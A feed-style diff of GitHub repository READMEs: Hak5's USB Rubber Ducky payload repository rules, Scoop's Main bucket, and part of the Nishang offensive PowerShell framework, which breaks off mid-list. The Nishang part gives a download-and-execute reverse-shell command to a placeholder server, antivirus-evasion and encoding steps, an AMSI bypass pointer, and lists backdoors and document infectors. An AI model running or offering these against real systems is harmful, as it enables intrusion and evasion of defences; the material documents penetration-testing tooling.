+&lt;p&gt; Learn Advanced DuckyScript directly from the creators and unlock creative potential for the USB Rubber Ducky. Covering all aspects of advanced DuckyScript and Keystroke Injection attacks, these practical lessons build on one another from the basics on up. &lt;/p&gt;
+&lt;p&gt;This online course includes 7 hours of video instruction covering 54 lessons, 40+ exercises to reinforce your knowledge, quizzes throughout as well as 8 projects to test your skills.&lt;/p&gt; 
+&lt;p&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;/p&gt; 
+&lt;h1&gt;&lt;a href=&quot;https://payloadstudio.hak5.org&quot;&gt;Build your payloads with PayloadStudio&lt;/a&gt;&lt;/h1&gt; 
+&lt;p align=&quot;center&quot;&gt; Take your DuckyScript™ payloads to the next level with this full-featured,&lt;b&gt; web-based (entirely client side) &lt;/b&gt; development environment. &lt;br /&gt; &lt;a href=&quot;https://payloadstudio.hak5.org&quot;&gt;&lt;img width=&quot;500px&quot; src=&quot;https://cdn.shopify.com/s/files/1/0068/2142/products/payload-studio-icon_2000x.png&quot; /&gt;&lt;/a&gt; &lt;br /&gt; &lt;i&gt;Payload studio features all of the conveniences of a modern IDE, right from your browser. From syntax highlighting and auto-completion to live error-checking and repo synchronization - building payloads for Hak5 hotplug tools has never been easier! &lt;br /&gt;&lt;br /&gt; Supports your favorite Hak5 gear - USB Rubber Ducky, Bash Bunny, Key Croc, Shark Jack, Packet Squirrel &amp;amp; LAN Turtle! &lt;br /&gt;&lt;br /&gt;&lt;/i&gt;&lt;br /&gt; &lt;a href=&quot;https://hak5.org/products/payload-studio-pro&quot;&gt;Become a PayloadStudio Pro&lt;/a&gt; and &lt;b&gt; Unleash your hacking creativity! &lt;/b&gt; &lt;br /&gt; OR &lt;br /&gt; &lt;a href=&quot;https://payloadstudio.hak5.org/community/&quot;&gt; Try Community Edition FREE&lt;/a&gt; &lt;br /&gt;&lt;br /&gt; &lt;img src=&quot;https://cdn.shopify.com/s/files/1/0068/2142/files/themes1_1_600x.gif?v=1659642557&quot; /&gt; &lt;br /&gt; &lt;i&gt; Payload Studio Themes Preview GIF &lt;/i&gt; &lt;br /&gt;&lt;br /&gt; &lt;img src=&quot;https://cdn.shopify.com/s/files/1/0068/2142/files/AUTOCOMPLETE3_600x.gif?v=1659640513&quot; /&gt; &lt;br /&gt; &lt;i&gt; Payload Studio Autocomplete Preview GIF &lt;/i&gt; &lt;/p&gt; 
+&lt;h2&gt;DuckyScript Ecosystem&lt;/h2&gt; 
+&lt;h3&gt;&lt;a href=&quot;https://github.com/hak5/usbrubberducky-payloads/raw/master/languages&quot;&gt;Languages &lt;/a&gt;&lt;/h3&gt; Support for different keyboard layouts can be found, modified or contributed to in the 
+&lt;b&gt;&lt;a href=&quot;https://github.com/hak5/usbrubberducky-payloads/raw/master/languages&quot;&gt; languages/ &lt;/a&gt;&lt;/b&gt; directory of this repository. 
+&lt;p&gt;Compiling payloads for the correct language / keyboard layout has never been easier:&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://payloadstudio.hak5.org&quot;&gt; Open PayloadStudio &amp;gt; Settings &amp;gt; Compiler Settings&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;PayloadStudio includes all the languages provided in this repo built-in for your convenience.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://hak5.org/products/payload-studio-pro&quot;&gt;PayloadStudio Pro&lt;/a&gt; has a &lt;b&gt;dedicated language editor&lt;/b&gt; specifically for editing and building language files!&lt;/p&gt; 
+&lt;p&gt;The default language is US &lt;a href=&quot;https://github.com/hak5/usbrubberducky-payloads/raw/master/languages/us.json&quot;&gt;(languages/us.json)&lt;/a&gt;&lt;/p&gt; 
+&lt;h3&gt;&lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/extensions&quot;&gt;Extensions&lt;/a&gt;&lt;/h3&gt; It should be clear by now that so much is possible with DuckyScript 3.0. The combination of keystroke injection with various attack modes, logic and data processing, along with the built-in features like randomization and internal variables — the possibilities for advanced payload functions seems endless. 
+&lt;p align=&quot;center&quot;&gt; &lt;br /&gt; &lt;img src=&quot;https://cdn.shopify.com/s/files/1/0068/2142/files/payload-studio-extensions_600x.gif?v=1659716795&quot; /&gt; &lt;br /&gt; &lt;i&gt; Payload Studio Extensions Preview GIF&lt;/i&gt; &lt;/p&gt; 
+&lt;p&gt;As the payload library continues to grow, so too will the DuckyScript 3.0 language. To that end, the extensions feature of the language and editor facilitate the continued growth of the language. &lt;b&gt;Extensions are blocks of reusable code which may be implemented in any payload. Think of them as snippets, or building blocks, upon which your next payload may benefit.&lt;/b&gt; While Hak5 developers cannot envision all possible use cases for the USB Rubber Ducky, the DuckyScript language has been architected in such a way so that the community as a whole may gain new features and abilities with each contributed extension.&lt;/p&gt; 
+&lt;p&gt;Extensions (beyond some first party examples) are currently reserved for collections of helper functions (+ required variables, defines, and configuration options) required to make a complex task simple - abstracting very complex problems down into one or a few calls for the ease of use to others (example: the translate extension).&lt;/p&gt; 
+&lt;p&gt;To add an extension to your payload, simply start typing the name of the desired extension in your payload from within PayloadStudio then select it from the auto-complete drop down. Alternatively the full library can be found from within the Extensions folder of this repo.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/extensions&quot; title=&quot;Read more here&quot;&gt;Read more here&lt;/a&gt;&lt;/p&gt; 
+&lt;h1&gt;&lt;a href=&quot;https://payloadhub.com&quot;&gt;Contributing&lt;/a&gt;&lt;/h1&gt; 
+&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://payloadhub.com&quot;&gt;&lt;img src=&quot;https://cdn.shopify.com/s/files/1/0068/2142/files/payloadhub.png?v=1652474600&quot; /&gt;&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://payloadhub.com&quot;&gt;View Featured Payloads and Leaderboard &lt;/a&gt; &lt;/p&gt; 
+&lt;h1&gt;Please adhere to the following best practices and style guides when submitting a payload.&lt;/h1&gt; 
+&lt;p&gt;Once you have developed your payload, you are encouraged to contribute to this repository by submitting a Pull Request. Reviewed and Approved pull requests will add your payload to this repository, where they may be publically available.&lt;/p&gt; 
+&lt;p&gt;Please include all resources required for the payload to run. If needed, provide a &lt;a href=&quot;http://README.md&quot;&gt;README.md&lt;/a&gt; in the root of your payload&#39;s directory to explain things such as intended use, required configurations, or anything that will not easily fit in the comments of the payload.txt itself. Please make sure that your payload is tested, and free of errors. If your payload contains (or is based off of) the work of other&#39;s please make sure to cite their work giving proper credit.&lt;/p&gt; 
+&lt;h3&gt;Purely Destructive payloads will not be accepted. No, it&#39;s not &quot;just a prank&quot;.&lt;/h3&gt; 
+&lt;p&gt;Subject to change. Please ensure any submissions meet the &lt;a href=&quot;https://github.com/hak5/usbrubberducky-payloads/raw/master/README.md&quot;&gt;latest version&lt;/a&gt; of these standards before submitting a Pull Request.&lt;/p&gt; 
+&lt;h2&gt;Naming Conventions&lt;/h2&gt; 
+&lt;p&gt;Please give your payload a unique, descriptive and appropriate name. Do not use spaces in payload, directory or file names. Each payload should be submit into its own directory, with &lt;code&gt;-&lt;/code&gt; or &lt;code&gt;_&lt;/code&gt; used in place of spaces, to one of the categories such as exfiltration, phishing, remote_access or recon. Do not create your own category.&lt;/p&gt; 
+&lt;h2&gt;Staged Payloads&lt;/h2&gt; 
+&lt;p&gt;&quot;Staged payloads&quot; are payloads that &lt;strong&gt;download&lt;/strong&gt; code from some resource external to the payload.txt.&lt;/p&gt; 
+&lt;p&gt;While staging code used in payloads is often useful and appropriate, using this (or another) github repository as the means of deploying those stages is not. This repository is &lt;strong&gt;not a CDN for deployment on target systems&lt;/strong&gt;.&lt;/p&gt; 
+&lt;p&gt;Staged code should be copied to and hosted on an appropriate server for doing so &lt;strong&gt;by the end user&lt;/strong&gt; - Github and this repository are simply resources for sharing code among developers and users. See: &lt;a href=&quot;https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies#5-site-access-and-safety&quot;&gt;GitHub acceptable use policies&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Additionally, any source code that is intended to be staged &lt;strong&gt;(by the end user on the appropriate infrastructure)&lt;/strong&gt; should be included in any payload submissions either in the comments of the payload itself or as a seperate file. &lt;strong&gt;Links to staged code are unacceptable&lt;/strong&gt;; not only for the reasons listed above but also for version control and user safety reasons. Arbitrary code hidden behind some pre-defined external resource via URL in a payload could be replaced at any point in the future unbeknownst to the user -- potentially turning a harmless payload into something dangerous.&lt;/p&gt; 
+&lt;h3&gt;Including URLs&lt;/h3&gt; 
+&lt;p&gt;URLs used for retrieving staged code should refer exclusively to &lt;strong&gt;&lt;a href=&quot;http://example.com&quot;&gt;example.com&lt;/a&gt;&lt;/strong&gt; using DEFINE in any payload submissions &lt;a href=&quot;https://github.com/hak5/usbrubberducky-payloads/raw/master/README.md#payload-configuration&quot;&gt;see Payload Configuration section below&lt;/a&gt;.&lt;/p&gt; 
+&lt;h3&gt;Staged Example&lt;/h3&gt; 
+&lt;p&gt;&lt;strong&gt;Example scenario: your payload downloads a script and the executes it on a target machine.&lt;/strong&gt;&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Include the script in the directory with your payload&lt;/li&gt; 
+ &lt;li&gt;Provide instructions for the user to move the script to the appropriate hosting service.&lt;/li&gt; 
+ &lt;li&gt;Provide a DEFINE with the placeholder &lt;a href=&quot;http://example.com&quot;&gt;example.com&lt;/a&gt; for the user to easily configure once they have hosted the script&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/exfiltration/Printer-Recon&quot;&gt;Simple Example of this style of payload&lt;/a&gt;&lt;/p&gt; 
+&lt;h2&gt;Payload Configuration&lt;/h2&gt; 
+&lt;p&gt;Be sure to take the following into careful consideration to ensure your payload is easily tested, used and maintained. In many cases, payloads will require some level of configuration &lt;strong&gt;by the end payload user&lt;/strong&gt;.&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;Abstract configuration(s) for ease of use. Use &lt;code&gt;DEFINE&lt;/code&gt; where possible. Best practice is to use labels that start with # for easy identification throughout your payload.&lt;/li&gt; 
+ &lt;li&gt;Remember to use PLACEHOLDERS for configurable portions of your payload - do not share your personal URLs, API keys, Passphrases, etc...&lt;/li&gt; 
+ &lt;li&gt;URLs to staged payloads SHOULD NOT BE INCLUDED. URLs should be replaced by &lt;a href=&quot;http://example.com&quot;&gt;example.com&lt;/a&gt;. Provide instructions on how to specific resources should be hosted on the appropriate infrastructure.&lt;/li&gt; 
+ &lt;li&gt;Make note of both REQUIRED and OPTIONAL configuration(s) in your payload using comments at the top of your payload or &quot;inline&quot; where applicable&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;pre&gt;
+Example: 
+	BEGINNING OF PAYLOAD 
+	... Payload Documentation... 
+
+	REM CONFIGURATION
+	REM REQUIRED - Provide URL used for Example
+	DEFINE #MY_TARGET_URL example.com
+
+	REM OPTIONAL - How long until payload starts; default 5s
+	DEFINE #BOOT_DELAY 5000
+
+	DELAY #BOOT_DELAY
+	...
+	STRING #MY_TARGET_URL
+	...
+&lt;/pre&gt; 
+&lt;h2&gt;Payload Documentation&lt;/h2&gt; 
+&lt;p&gt;Payloads should begin with &lt;code&gt;REM&lt;/code&gt; comments specifying the title of the payload, the author, the target, and a brief description.&lt;/p&gt; 
+&lt;pre&gt;
+Example:
+	BEGINNING OF PAYLOAD
+
+	REM Title: Example Payload
+	REM Author: Korben Dallas
+	REM Description: Opens hidden powershell and
+	REM Target: Windows 10
+	REM Props: Hak5, Darren Kitchen, Korben
+	REM Version: 1.0
+	REM Category: General
+&lt;/pre&gt; 
+&lt;h1&gt;&lt;a href=&quot;https://hak5.org/pages/policy&quot;&gt;Legal&lt;/a&gt;&lt;/h1&gt; 
+&lt;p&gt;Payloads from this repository are provided for educational purposes only. Hak5 gear is intended for authorized auditing and security analysis purposes only where permitted subject to local and international laws where applicable. Users are solely responsible for compliance with all laws of their locality. Hak5 LLC and affiliates claim no responsibility for unauthorized or unlawful use.&lt;/p&gt; 
+&lt;p&gt;USB Rubber Ducky and DuckyScript are the trademarks of Hak5 LLC. Copyright © 2010 Hak5 LLC. All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means without prior written permission from the copyright owner. USB Rubber Ducky and DuckyScript are subject to the Hak5 license agreement (&lt;a href=&quot;https://hak5.org/license&quot;&gt;https://hak5.org/license&lt;/a&gt;) DuckyScript is the intellectual property of Hak5 LLC for the sole benefit of Hak5 LLC and its licensees. To inquire about obtaining a license to use this material in your own project, contact us. Please report counterfeits and brand abuse to &lt;a href=&quot;mailto:legal@hak5.org&quot;&gt;legal@hak5.org&lt;/a&gt;. This material is for education, authorized auditing and analysis purposes where permitted subject to local and international laws. Users are solely responsible for compliance. Hak5 LLC claims no responsibility for unauthorized or unlawful use. Hak5 LLC products and technology are only available to BIS recognized license exception ENC favorable treatment countries pursuant to US 15 CFR Supplement No 3 to Part 740.&lt;/p&gt; 
+&lt;p&gt;See also:&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://shop.hak5.org/pages/software-license-agreement&quot;&gt;Hak5 Software License Agreement&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://shop.hak5.org/pages/terms-of-service&quot;&gt;Terms of Service&lt;/a&gt;&lt;/p&gt; 
+&lt;h1&gt;Disclaimer&lt;/h1&gt; 
+&lt;h3&gt;&lt;b&gt;As with any script, you are advised to proceed with caution.&lt;/b&gt;&lt;/h3&gt; 
+&lt;h3&gt;&lt;b&gt;Generally, payloads may execute commands on your device. As such, it is possible for a payload to damage your device. Payloads from this repository are provided AS-IS without warranty. While Hak5 makes a best effort to review payloads, there are no guarantees as to their effectiveness.&lt;/b&gt;&lt;/h3&gt;</description>
+      
+      <media:content url="https://repository-images.githubusercontent.com/385745965/8566c0ba-4444-48ad-ab0b-4c217c90c53d" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>ScoopInstaller/Main</title>
+      <link>https://github.com/ScoopInstaller/Main</link>
+      <description>&lt;p&gt;📦 The default bucket for Scoop.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Scoop Main &lt;a href=&quot;https://github.com/ScoopInstaller/Main/actions/workflows/ci.yml&quot;&gt;&lt;img src=&quot;https://github.com/ScoopInstaller/Main/actions/workflows/ci.yml/badge.svg?sanitize=true&quot; alt=&quot;Tests&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/ScoopInstaller/Main/actions/workflows/excavator.yml&quot;&gt;&lt;img src=&quot;https://github.com/ScoopInstaller/Main/actions/workflows/excavator.yml/badge.svg?sanitize=true&quot; alt=&quot;Excavator&quot; /&gt;&lt;/a&gt;&lt;/h1&gt; 
+&lt;p&gt;Core manifests for &lt;a href=&quot;https://scoop.sh&quot;&gt;Scoop&lt;/a&gt;, the Windows command-line installer. For manifests that fit the &lt;a href=&quot;https://github.com/ScoopInstaller/Scoop/wiki/Criteria-for-including-apps-in-the-main-bucket&quot;&gt;Main criteria&lt;/a&gt;.&lt;/p&gt; 
+&lt;h2&gt;How do I install these manifests?&lt;/h2&gt; 
+&lt;p&gt;Just do &lt;code&gt;scoop install &amp;lt;manifest&amp;gt;&lt;/code&gt;. This is the default bucket for Scoop and is added by default.&lt;/p&gt; 
+&lt;h2&gt;How do I contribute new manifests?&lt;/h2&gt; 
+&lt;p&gt;To make a new manifest contribution, please read the &lt;a href=&quot;https://github.com/ScoopInstaller/.github/raw/main/.github/CONTRIBUTING.md&quot;&gt;Contributing Guide&lt;/a&gt;.&lt;/p&gt;</description>
+      
+      <media:content url="https://repository-images.githubusercontent.com/168479288/ce63219d-b7d6-4a1f-9b28-61deca23c757" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>samratashok/nishang</title>
+      <link>https://github.com/samratashok/nishang</link>
+      <description>&lt;p&gt;Nishang - Offensive PowerShell for red team, penetration testing and offensive security.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Nishang&lt;/h1&gt; 
+&lt;h3&gt;Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.&lt;/h3&gt; 
+&lt;p&gt;By &lt;a href=&quot;https://twitter.com/nikhil_mitt&quot;&gt;Nikhil Mittal&lt;/a&gt; Founder of &lt;a href=&quot;https://www.alteredsecurity.com/&quot;&gt;Altered Security - Hands-on red team and enterprise security training!&lt;/a&gt;&lt;/p&gt; 
+&lt;h4&gt;Usage&lt;/h4&gt; 
+&lt;p&gt;Import all the scripts in the current PowerShell session (PowerShell v3 onwards).&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; Import-Module .\nishang.psm1
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;Use the individual scripts with dot sourcing.&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . C:\nishang\Gather\Get-Information.ps1
+
+PS C:\nishang&amp;gt; Get-Information
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;To get help about any script or function, use:&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; Get-Help [scriptname] -full
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.&lt;/p&gt; 
+&lt;p&gt;For example, to see the help about Get-WLAN-Keys.ps1, use&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . C:\nishang\Get-WLAN-Keys.ps1
+
+PS C:\nishang&amp;gt; Get-Help Get-WLAN-Keys -Full
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;h4&gt;Anti Virus&lt;/h4&gt; 
+&lt;p&gt;Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:&lt;/p&gt; 
+&lt;p&gt;Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://&amp;lt;yourwebserver&amp;gt;/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;Method 2. Use the &lt;code&gt;-encodedcommand&lt;/code&gt; (or &lt;code&gt;-e&lt;/code&gt;) parameter of PowerShell All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) &lt;code&gt;&quot;Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]&quot;&lt;/code&gt;.&lt;/p&gt; 
+&lt;p&gt;Encode the scrript using Invoke-Encode from Nishang:&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\nishang&amp;gt; . \nishang\Utility\Invoke-Encode
+
+PS C:\nishang&amp;gt; Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;Encoded data written to .\encoded.txt&lt;/p&gt; 
+&lt;p&gt;Encoded command written to .\encodedcommand.txt&lt;/p&gt; 
+&lt;p&gt;From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:&lt;/p&gt; 
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Users\target&amp;gt; powershell -e [encodedscript]
+&lt;/code&gt;&lt;/pre&gt; 
+&lt;p&gt;If the scripts still get detected changing the function and parameter names and removing the help content will help.&lt;/p&gt; 
+&lt;p&gt;In case Windows 10&#39;s AMSI is still blocking script execution, see this blog: &lt;a href=&quot;http://www.labofapenetrationtester.com/2016/09/amsi.html&quot;&gt;http://www.labofapenetrationtester.com/2016/09/amsi.html&lt;/a&gt;&lt;/p&gt; 
+&lt;h4&gt;Scripts&lt;/h4&gt; 
+&lt;p&gt;Nishang currently contains the following scripts and payloads.&lt;/p&gt; 
+&lt;h4&gt;ActiveDirectory&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/ActiveDirectory/Set-DCShadowPermissions.ps1&quot;&gt;Set-DCShadowPermissions&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Modify AD objects to provide minimal permissions required for DCShadow.&lt;/p&gt; 
+&lt;h4&gt;Antak - the Webshell&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/tree/master/Antak-WebShell&quot;&gt;Antak&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell.&lt;/p&gt; 
+&lt;h4&gt;Backdoors&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/HTTP-Backdoor.ps1&quot;&gt;HTTP-Backdoor&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/DNS_TXT_Pwnage.ps1&quot;&gt;DNS_TXT_Pwnage&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Execute-OnTime.ps1&quot;&gt;Execute-OnTime&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A backdoor which can execute PowerShell scripts at a given time on a target.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Gupt-Backdoor.ps1&quot;&gt;Gupt-Backdoor&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Add-ScrnSaveBackdoor.ps1&quot;&gt;Add-ScrnSaveBackdoor&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A backdoor which can use Windows screen saver for remote command and script execution.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Invoke-ADSBackdoor.ps1&quot;&gt;Invoke-ADSBackdoor&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A backdoor which can use alternate data streams and Windows Registry to achieve persistence.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Add-RegBackdoor.ps1&quot;&gt;Add-RegBackdoor&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U).&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Set-RemoteWMI.ps1&quot;&gt;Set-RemoteWMI&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Backdoors/Set-RemotePSRemoting.ps1&quot;&gt;Set-RemotePSRemoting&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Modify permissions of PowerShell remoting to allow access to a non-admin user.&lt;/p&gt; 
+&lt;h4&gt;Bypass&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Bypass/Invoke-AmsiBypass.ps1&quot;&gt;Invoke-AmsiBypass&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Implementation of publicly known methods to bypass/avoid AMSI.&lt;/p&gt; 
+&lt;h4&gt;Client&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-CHM.ps1&quot;&gt;Out-CHM&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create infected CHM files which can execute PowerShell commands and scripts.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Word.ps1&quot;&gt;Out-Word&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create Word files and infect existing ones to run PowerShell commands and scripts.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Excel.ps1&quot;&gt;Out-Excel&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create Excel files and infect existing ones to run PowerShell commands and scripts.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-HTA.ps1&quot;&gt;Out-HTA&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create a HTA file which can be deployed on a web server and used in phishing campaigns.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Java.ps1&quot;&gt;Out-Java&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create signed JAR files which can be used with applets for script and command execution.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-Shortcut.ps1&quot;&gt;Out-Shortcut&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create shortcut files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-WebQuery.ps1&quot;&gt;Out-WebQuery&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create IQY files for phishing credentials and SMB hashes.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-JS.ps1&quot;&gt;Out-JS&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create JS files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-SCT.ps1&quot;&gt;Out-SCT&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create SCT files capable of executing PowerShell commands and scripts.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Client/Out-SCF.ps1&quot;&gt;Out-SCF&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Create a SCF file which can be used for capturing NTLM hash challenges.&lt;/p&gt; 
+&lt;h4&gt;Escalation&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Enable-DuplicateToken.ps1&quot;&gt;Enable-DuplicateToken&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;When SYSTEM privileges are required.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Remove-Update.ps1&quot;&gt;Remove-Update&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Introduce vulnerabilities by removing patches.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Escalation/Invoke-PsUACme.ps1&quot;&gt;Invoke-PsUACme&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Bypass UAC.&lt;/p&gt; 
+&lt;h4&gt;Execution&lt;/h4&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Download-Execute-PS.ps1&quot;&gt;Download-Execute-PS&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Download and execute a PowerShell script in memory.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Download_Execute.ps1&quot;&gt;Download_Execute&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Download an executable in text format, convert it to an executable, and execute.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Execute-Command-MSSQL.ps1&quot;&gt;Execute-Command-MSSQL&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Execute-DNSTXT-Code.ps1&quot;&gt;Execute-DNSTXT-Code&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Execute shellcode in memory using DNS TXT queries.&lt;/p&gt; 
+&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/raw/master/Execution/Out-RundllCommand.ps1&quot;&gt;Out-RundllCommand&lt;/a&gt;&lt;/p&gt; 
+&lt;p&gt;Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.&lt;/p&gt; 
+&lt;h4&gt;Gather&lt;/h4&gt; 
